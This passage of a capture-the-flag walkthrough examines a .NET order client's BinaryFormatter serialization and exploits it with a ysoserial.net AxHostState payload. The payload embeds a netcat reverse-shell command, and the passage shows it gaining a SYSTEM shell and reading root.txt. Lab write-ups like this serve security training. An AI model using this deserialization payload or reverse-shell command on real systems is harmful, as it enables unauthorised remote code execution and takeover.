oxdf@hacky$ echo "AAEAAAD/////AQAAAAAAAAAMAgAAAEJTY3JhbWJsZUxpYiwgVmVyc2lvbj0xLjAuMy4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPW51bGwFAQAAABZTY3JhbWJsZUxpYi5TYWxlc09yZGVyBwAAAAtfSXNDb21wbGV0ZRBfUmVmZXJlbmNlTnVtYmVyD19RdW90ZVJlZmVyZW5jZQlfU2FsZXNSZXALX09yZGVySXRlbXMIX0R1ZURhdGUKX1RvdGFsQ29zdAABAQEDAAABf1N5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkxpc3RgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0NBgIAAAAABgMAAAAKU0NSTVNPMzYwMQYEAAAAC1NDUk1RVTkxODcyBgUAAAAGSiBIYWxsCQYAAAAAQBHK4mnaCAAAAAAAIHJABAYAAAB/U3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuTGlzdGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQMAAAAGX2l0ZW1zBV9zaXplCF92ZXJzaW9uBgAACAgJBwAAAAAAAAAAAAAAEQcAAAAAAAAACw==|AAEAAAD/////AQAAAAAAAAAMAgAAAEJTY3JhbWJsZUxpYiwgVmVyc2lvbj0xLjAuMy4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPW51bGwFAQAAABZTY3JhbWJsZUxpYi5TYWxlc09yZGVyBwAAAAtfSXNDb21wbGV0ZRBfUmVmZXJlbmNlTnVtYmVyD19RdW90ZVJlZmVyZW5jZQlfU2FsZXNSZXALX09yZGVySXRlbXMIX0R1ZURhdGUKX1RvdGFsQ29zdAABAQEDAAABf1N5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkxpc3RgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0NBgIAAAAABgMAAAAKU0NSTVNPMzc0OQYEAAAAC1NDUk1RVTkyMjEwBgUAAAAJUyBKZW5raW5zCQYAAAAAAJ07rZbaCAAAAAAAUJJABAYAAAB/U3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuTGlzdGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQMAAAAGX2l0ZW1zBV9zaXplCF92ZXJzaW9uBgAACAgJBwAAAAAAAAAAAAAAEQcAAAAAAAAACw==" | base64 -d | xxd
base64: invalid input
00000000: 0001 0000 00ff ffff ff01 0000 0000 0000  ................
00000010: 000c 0200 0000 4253 6372 616d 626c 654c  ......BScrambleL
00000020: 6962 2c20 5665 7273 696f 6e3d 312e 302e  ib, Version=1.0.
00000030: 332e 302c 2043 756c 7475 7265 3d6e 6575  3.0, Culture=neu
00000040: 7472 616c 2c20 5075 626c 6963 4b65 7954  tral, PublicKeyT
00000050: 6f6b 656e 3d6e 756c 6c05 0100 0000 1653  oken=null......S
00000060: 6372 616d 626c 654c 6962 2e53 616c 6573  crambleLib.Sales
00000070: 4f72 6465 7207 0000 000b 5f49 7343 6f6d  Order....._IsCom
00000080: 706c 6574 6510 5f52 6566 6572 656e 6365  plete._Reference
00000090: 4e75 6d62 6572 0f5f 5175 6f74 6552 6566  Number._QuoteRef
000000a0: 6572 656e 6365 095f 5361 6c65 7352 6570  erence._SalesRep
000000b0: 0b5f 4f72 6465 7249 7465 6d73 085f 4475  ._OrderItems._Du
000000c0: 6544 6174 650a 5f54 6f74 616c 436f 7374  eDate._TotalCost
000000d0: 0001 0101 0300 0001 7f53 7973 7465 6d2e  .........System.
000000e0: 436f 6c6c 6563 7469 6f6e 732e 4765 6e65  Collections.Gene
000000f0: 7269 632e 4c69 7374 6031 5b5b 5379 7374  ric.List`1[[Syst
00000100: 656d 2e53 7472 696e 672c 206d 7363 6f72  em.String, mscor
00000110: 6c69 622c 2056 6572 7369 6f6e 3d34 2e30  lib, Version=4.0
00000120: 2e30 2e30 2c20 4375 6c74 7572 653d 6e65  .0.0, Culture=ne
00000130: 7574 7261 6c2c 2050 7562 6c69 634b 6579  utral, PublicKey
00000140: 546f 6b65 6e3d 6237 3761 3563 3536 3139  Token=b77a5c5619
00000150: 3334 6530 3839 5d5d 0d06 0200 0000 0006  34e089]]........
00000160: 0300 0000 0a53 4352 4d53 4f33 3630 3106  .....SCRMSO3601.
00000170: 0400 0000 0b53 4352 4d51 5539 3138 3732  .....SCRMQU91872
00000180: 0605 0000 0006 4a20 4861 6c6c 0906 0000  ......J Hall....
00000190: 0000 4011 cae2 69da 0800 0000 0000 2072  ..@...i....... r
000001a0: 4004 0600 0000 7f53 7973 7465 6d2e 436f  @......System.Co
000001b0: 6c6c 6563 7469 6f6e 732e 4765 6e65 7269  llections.Generi
000001c0: 632e 4c69 7374 6031 5b5b 5379 7374 656d  c.List`1[[System
000001d0: 2e53 7472 696e 672c 206d 7363 6f72 6c69  .String, mscorli
000001e0: 622c 2056 6572 7369 6f6e 3d34 2e30 2e30  b, Version=4.0.0
000001f0: 2e30 2c20 4375 6c74 7572 653d 6e65 7574  .0, Culture=neut
00000200: 7261 6c2c 2050 7562 6c69 634b 6579 546f  ral, PublicKeyTo
00000210: 6b65 6e3d 6237 3761 3563 3536 3139 3334  ken=b77a5c561934
00000220: 6530 3839 5d5d 0300 0000 065f 6974 656d  e089]]....._item
00000230: 7305 5f73 697a 6508 5f76 6572 7369 6f6e  s._size._version
00000240: 0600 0008 0809 0700 0000 0000 0000 0000  ................
00000250: 0000 1107 0000 0000 0000 000b            ............

```

#### New Order

On the “New Order” tab, I’ll fill out an order:

![image-20220609163704958](https://0xdfimages.gitlab.io/img/image-20220609163704958.png)

On clicking “Upload”, it pops a box saying it was successful:

![image-20220609163727552](https://0xdfimages.gitlab.io/img/image-20220609163727552.png)

WireShark shows a similar TCP stream, this time with the client sending base64-encoded serialized data to the server:

![image-20220609163813138](https://0xdfimages.gitlab.io/img/image-20220609163813138.png)

#### Debug Log

If I enabled it in the connection settings, or by going to “Tools” > “Enable Debug Logging”, it will write `ScrambleDebugLog.txt` in the same directory as the exe. This is not only another way to see the serialized payloads, but there are some hints in there as well:

```

6/9/2022 1:31:48 PM	Sending data to server: LIST_ORDERS;
6/9/2022 1:31:48 PM	Getting response from server
6/9/2022 1:31:48 PM	Received from server: SUCCESS;AAEAAAD/////AQAAAAAAAAAMAgAAAEJTY3JhbWJsZUxpYiwgVmVyc2lvbj0xLjAuMy4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPW51bGwFAQAAABZTY3JhbWJsZUxpYi5TYWxlc09yZGVyBwAAAAtfSXNDb21wbGV0ZRBfUmVmZXJlbmNlTnVtYmVyD19RdW90ZVJlZmVyZW5jZQlfU2FsZXNSZXALX09yZGVySXRlbXMIX0R1ZURhdGUKX1RvdGFsQ29zdAABAQEDAAABf1N5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkxpc3RgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0NBgIAAAAABgMAAAAKU0NSTVNPMzYwMQYEAAAAC1NDUk1RVTkxODcyBgUAAAAGSiBIYWxsCQYAAAAAQBHK4mnaCAAAAAAAIHJABAYAAAB/U3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuTGlzdGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQMAAAAGX2l0ZW1zBV9zaXplCF92ZXJzaW9uBgAACAgJBwAAAAAAAAAAAAAAEQcAAAAAAAAACw==|AAEAAAD/////AQAAAAAAAAAMAgAAAEJTY3JhbWJsZUxpYiwgVmVyc2lvbj0xLjAuMy4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPW51bGwFAQAAABZTY3JhbWJsZUxpYi5TYWxlc09yZGVyBwAAAAtfSXNDb21wbGV0ZRBfUmVmZXJlbmNlTnVtYmVyD19RdW90ZVJlZmVyZW5jZQlfU2FsZXNSZXALX09yZGVySXRlbXMIX0R1ZURhdGUKX1RvdGFsQ29zdAABAQEDAAABf1N5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkxpc3RgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0NBgIAAAAABgMAAAAKU0NSTVNPMzc0OQYEAAAAC1NDUk1RVTkyMjEwBgUAAAAJUyBKZW5raW5zCQYAAAAAAJ07rZbaCAAAAAAAUJJABAYAAAB/U3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuTGlzdGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQMAAAAGX2l0ZW1zBV9zaXplCF92ZXJzaW9uBgAACAgJBwAAAAAAAAAAAAAAEQcAAAAAAAAACw==
6/9/2022 1:31:48 PM	Parsing server response
6/9/2022 1:31:48 PM	Response type = Success
6/9/2022 1:31:48 PM	Splitting and parsing sales orders
6/9/2022 1:31:48 PM	Found 2 sales orders in server response
6/9/2022 1:31:48 PM	Deserializing single sales order from base64: AAEAAAD/////AQAAAAAAAAAMAgAAAEJTY3JhbWJsZUxpYiwgVmVyc2lvbj0xLjAuMy4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPW51bGwFAQAAABZTY3JhbWJsZUxpYi5TYWxlc09yZGVyBwAAAAtfSXNDb21wbGV0ZRBfUmVmZXJlbmNlTnVtYmVyD19RdW90ZVJlZmVyZW5jZQlfU2FsZXNSZXALX09yZGVySXRlbXMIX0R1ZURhdGUKX1RvdGFsQ29zdAABAQEDAAABf1N5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkxpc3RgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0NBgIAAAAABgMAAAAKU0NSTVNPMzYwMQYEAAAAC1NDUk1RVTkxODcyBgUAAAAGSiBIYWxsCQYAAAAAQBHK4mnaCAAAAAAAIHJABAYAAAB/U3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuTGlzdGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQMAAAAGX2l0ZW1zBV9zaXplCF92ZXJzaW9uBgAACAgJBwAAAAAAAAAAAAAAEQcAAAAAAAAACw==
6/9/2022 1:31:48 PM	Binary formatter init successful
6/9/2022 1:31:48 PM	Deserialization successful
6/9/2022 1:31:48 PM	Deserializing single sales order from base64: AAEAAAD/////AQAAAAAAAAAMAgAAAEJTY3JhbWJsZUxpYiwgVmVyc2lvbj0xLjAuMy4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPW51bGwFAQAAABZTY3JhbWJsZUxpYi5TYWxlc09yZGVyBwAAAAtfSXNDb21wbGV0ZRBfUmVmZXJlbmNlTnVtYmVyD19RdW90ZVJlZmVyZW5jZQlfU2FsZXNSZXALX09yZGVySXRlbXMIX0R1ZURhdGUKX1RvdGFsQ29zdAABAQEDAAABf1N5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkxpc3RgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0NBgIAAAAABgMAAAAKU0NSTVNPMzc0OQYEAAAAC1NDUk1RVTkyMjEwBgUAAAAJUyBKZW5raW5zCQYAAAAAAJ07rZbaCAAAAAAAUJJABAYAAAB/U3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuTGlzdGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQMAAAAGX2l0ZW1zBV9zaXplCF92ZXJzaW9uBgAACAgJBwAAAAAAAAAAAAAAEQcAAAAAAAAACw==
6/9/2022 1:31:48 PM	Binary formatter init successful
6/9/2022 1:31:48 PM	Deserialization successful
6/9/2022 1:31:48 PM	Finished deserializing all sales orders
6/9/2022 1:37:12 PM	Uploading new order with reference 1
6/9/2022 1:37:12 PM	Binary formatter init successful
6/9/2022 1:37:12 PM	Order serialized to base64: AAEAAAD/////AQAAAAAAAAAMAgAAAEJTY3JhbWJsZUxpYiwgVmVyc2lvbj0xLjAuMy4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPW51bGwFAQAAABZTY3JhbWJsZUxpYi5TYWxlc09yZGVyBwAAAAtfSXNDb21wbGV0ZRBfUmVmZXJlbmNlTnVtYmVyD19RdW90ZVJlZmVyZW5jZQlfU2FsZXNSZXALX09yZGVySXRlbXMIX0R1ZURhdGUKX1RvdGFsQ29zdAABAQEDAAABf1N5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkxpc3RgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0NBgIAAAAABgMAAAABMQYEAAAABDEwMDAGBQAAAApSIEdvb2RoYW5kCQYAAAAAgCH/qknaCAAAAAAAQI9ABAYAAAB/U3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuTGlzdGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQMAAAAGX2l0ZW1zBV9zaXplCF92ZXJzaW9uBgAACAgJBwAAAAAAAAAAAAAAEQcAAAAAAAAACw==
6/9/2022 1:37:12 PM	Connecting to server
6/9/2022 1:37:12 PM	Received from server: SCRAMBLECORP_ORDERS_V1.0.3;
6/9/2022 1:37:12 PM	Parsing server response
6/9/2022 1:37:12 PM	Response type = Banner
6/9/2022 1:37:12 PM	Sending data to server: UPLOAD_ORDER;AAEAAAD/////AQAAAAAAAAAMAgAAAEJTY3JhbWJsZUxpYiwgVmVyc2lvbj0xLjAuMy4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPW51bGwFAQAAABZTY3JhbWJsZUxpYi5TYWxlc09yZGVyBwAAAAtfSXNDb21wbGV0ZRBfUmVmZXJlbmNlTnVtYmVyD19RdW90ZVJlZmVyZW5jZQlfU2FsZXNSZXALX09yZGVySXRlbXMIX0R1ZURhdGUKX1RvdGFsQ29zdAABAQEDAAABf1N5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkxpc3RgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0NBgIAAAAABgMAAAABMQYEAAAABDEwMDAGBQAAAApSIEdvb2RoYW5kCQYAAAAAgCH/qknaCAAAAAAAQI9ABAYAAAB/U3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuTGlzdGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQMAAAAGX2l0ZW1zBV9zaXplCF92ZXJzaW9uBgAACAgJBwAAAAAAAAAAAAAAEQcAAAAAAAAACw==
6/9/2022 1:37:12 PM	Getting response from server
6/9/2022 1:37:12 PM	Received from server: SUCCESS;

```

“Binary formatter init successful” will be useful in the next attack.

I can see exactly in the code where this happens, in the `SalesOrder` class in `ScrambleLib.dll`:

```

// Token: 0x06000024 RID: 36 RVA: 0x000022C0 File Offset: 0x000004C0
public string SerializeToBase64()
{
    BinaryFormatter binaryFormatter = new BinaryFormatter();
    Log.Write("Binary formatter init successful");
    string result;
    using (MemoryStream memoryStream = new MemoryStream())
    {
        binaryFormatter.Serialize(memoryStream, this);
        result = Convert.ToBase64String(memoryStream.ToArray());
    }
    return result;
}

```

### Deserialization Attack

#### Generate Payload

I’ll download the latest copy of ysoserial.net from the [release page](https://github.com/pwntester/ysoserial.net/releases). This is a tool that will generate .NET serialized payloads that will abuse different gadgets in the existing code to get code execution.

Some Googling about the binary formatter class specifically will show it’s insecure. From [Microsoft doc](https://docs.microsoft.com/en-us/dotnet/standard/serialization/binaryformatter-security-guide):

![image-20220609165011806](https://0xdfimages.gitlab.io/img/image-20220609165011806.png)

Knowing the plugin that’s installed, I just need to pick a gadget. They are all listed on the [GitHub page](https://github.com/pwntester/ysoserial.net) or with `ysoserial.exe -h`. I want one that works with `BinaryFormatter`, and I’ll start with ones that don’t require any special conditions. `AxHostState` seems like a good start (many will work). I’ll it:

```

PS > .\ysoserial.exe -f BinaryFormatter -g AxHostState -o base64 -c "C:\\programdata\\nc64.exe 10.10.14.6 444 -e cmd.exe"
AAEAAAD/////AQAAAAAAAAAMAgAAAFdTeXN0ZW0uV2luZG93cy5Gb3JtcywgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkFAQAAACFTeXN0ZW0uV2luZG93cy5Gb3Jtcy5BeEhvc3QrU3RhdGUBAAAAEVByb3BlcnR5QmFnQmluYXJ5BwICAAAACQMAAAAPAwAAAL8DAAACAAEAAAD/////AQAAAAAAAAAMAgAAAF5NaWNyb3NvZnQuUG93ZXJTaGVsbC5FZGl0b3IsIFZlcnNpb249My4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1BQEAAABCTWljcm9zb2Z0LlZpc3VhbFN0dWRpby5UZXh0LkZvcm1hdHRpbmcuVGV4dEZvcm1hdHRpbmdSdW5Qcm9wZXJ0aWVzAQAAAA9Gb3JlZ3JvdW5kQnJ1c2gBAgAAAAYDAAAA4QU8P3htbCB2ZXJzaW9uPSIxLjAiIGVuY29kaW5nPSJ1dGYtOCI/Pg0KPE9iamVjdERhdGFQcm92aWRlciBNZXRob2ROYW1lPSJTdGFydCIgSXNJbml0aWFsTG9hZEVuYWJsZWQ9IkZhbHNlIiB4bWxucz0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwvcHJlc2VudGF0aW9uIiB4bWxuczpzZD0iY2xyLW5hbWVzcGFjZTpTeXN0ZW0uRGlhZ25vc3RpY3M7YXNzZW1ibHk9U3lzdGVtIiB4bWxuczp4PSJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dpbmZ4LzIwMDYveGFtbCI+DQogIDxPYmplY3REYXRhUHJvdmlkZXIuT2JqZWN0SW5zdGFuY2U+DQogICAgPHNkOlByb2Nlc3M+DQogICAgICA8c2Q6UHJvY2Vzcy5TdGFydEluZm8+DQogICAgICAgIDxzZDpQcm9jZXNzU3RhcnRJbmZvIEFyZ3VtZW50cz0iL2MgQzpcXHByb2dyYW1kYXRhXFxuYzY0LmV4ZSAxMC4xMC4xNC42IDQ0NCAtZSBjbWQuZXhlIiBTdGFuZGFyZEVycm9yRW5jb2Rpbmc9Int4Ok51bGx9IiBTdGFuZGFyZE91dHB1dEVuY29kaW5nPSJ7eDpOdWxsfSIgVXNlck5hbWU9IiIgUGFzc3dvcmQ9Int4Ok51bGx9IiBEb21haW49IiIgTG9hZFVzZXJQcm9maWxlPSJGYWxzZSIgRmlsZU5hbWU9ImNtZCIgLz4NCiAgICAgIDwvc2Q6UHJvY2Vzcy5TdGFydEluZm8+DQogICAgPC9zZDpQcm9jZXNzPg0KICA8L09iamVjdERhdGFQcm92aWRlci5PYmplY3RJbnN0YW5jZT4NCjwvT2JqZWN0RGF0YVByb3ZpZGVyPgsL

```

#### Send Payload

I didn’t upload `nc64.exe` earlier, I’ll do that now.

I’ll listen with `nc` on TCP 444 and connect to 4411 with `nc`:

```

PS > nc64 10.10.11.168 4411
SCRAMBLECORP_ORDERS_V1.0.3;

```

Just like in WireShark, I’ll enter `UPLOAD_ORDER;[serialized object]`:

```

PS > nc64 10.10.11.168 4411
SCRAMBLECORP_ORDERS_V1.0.3;
UPLOAD_ORDER;AAEAAAD/////AQAAAAAAAAAMAgAAAFdTeXN0ZW0uV2luZG93cy5Gb3JtcywgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkFAQAAACFTeXN0ZW0uV2luZG93cy5Gb3Jtcy5BeEhvc3QrU3RhdGUBAAAAEVByb3BlcnR5QmFnQmluYXJ5BwICAAAACQMAAAAPAwAAAL8DAAACAAEAAAD/////AQAAAAAAAAAMAgAAAF5NaWNyb3NvZnQuUG93ZXJTaGVsbC5FZGl0b3IsIFZlcnNpb249My4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1BQEAAABCTWljcm9zb2Z0LlZpc3VhbFN0dWRpby5UZXh0LkZvcm1hdHRpbmcuVGV4dEZvcm1hdHRpbmdSdW5Qcm9wZXJ0aWVzAQAAAA9Gb3JlZ3JvdW5kQnJ1c2gBAgAAAAYDAAAA4QU8P3htbCB2ZXJzaW9uPSIxLjAiIGVuY29kaW5nPSJ1dGYtOCI/Pg0KPE9iamVjdERhdGFQcm92aWRlciBNZXRob2ROYW1lPSJTdGFydCIgSXNJbml0aWFsTG9hZEVuYWJsZWQ9IkZhbHNlIiB4bWxucz0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwvcHJlc2VudGF0aW9uIiB4bWxuczpzZD0iY2xyLW5hbWVzcGFjZTpTeXN0ZW0uRGlhZ25vc3RpY3M7YXNzZW1ibHk9U3lzdGVtIiB4bWxuczp4PSJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dpbmZ4LzIwMDYveGFtbCI+DQogIDxPYmplY3REYXRhUHJvdmlkZXIuT2JqZWN0SW5zdGFuY2U+DQogICAgPHNkOlByb2Nlc3M+DQogICAgICA8c2Q6UHJvY2Vzcy5TdGFydEluZm8+DQogICAgICAgIDxzZDpQcm9jZXNzU3RhcnRJbmZvIEFyZ3VtZW50cz0iL2MgQzpcXHByb2dyYW1kYXRhXFxuYzY0LmV4ZSAxMC4xMC4xNC42IDQ0NCAtZSBjbWQuZXhlIiBTdGFuZGFyZEVycm9yRW5jb2Rpbmc9Int4Ok51bGx9IiBTdGFuZGFyZE91dHB1dEVuY29kaW5nPSJ7eDpOdWxsfSIgVXNlck5hbWU9IiIgUGFzc3dvcmQ9Int4Ok51bGx9IiBEb21haW49IiIgTG9hZFVzZXJQcm9maWxlPSJGYWxzZSIgRmlsZU5hbWU9ImNtZCIgLz4NCiAgICAgIDwvc2Q6UHJvY2Vzcy5TdGFydEluZm8+DQogICAgPC9zZDpQcm9jZXNzPg0KICA8L09iamVjdERhdGFQcm92aWRlci5PYmplY3RJbnN0YW5jZT4NCjwvT2JqZWN0RGF0YVByb3ZpZGVyPgsL
ERROR_GENERAL;Error deserializing sales order: Unable to cast object of type 'State' to type 'ScrambleLib.SalesOrder'.

```

It throws an error, and hangs. At `nc`:

```

PS > nc64 -lvnp 444
listening on [any] 444 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.11.168] 58314
Microsoft Windows [Version 10.0.17763.2989]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system

```

And I can grab `root.txt`:

```

C:\Users\administrator\Desktop>type root.txt
506ae611************************

```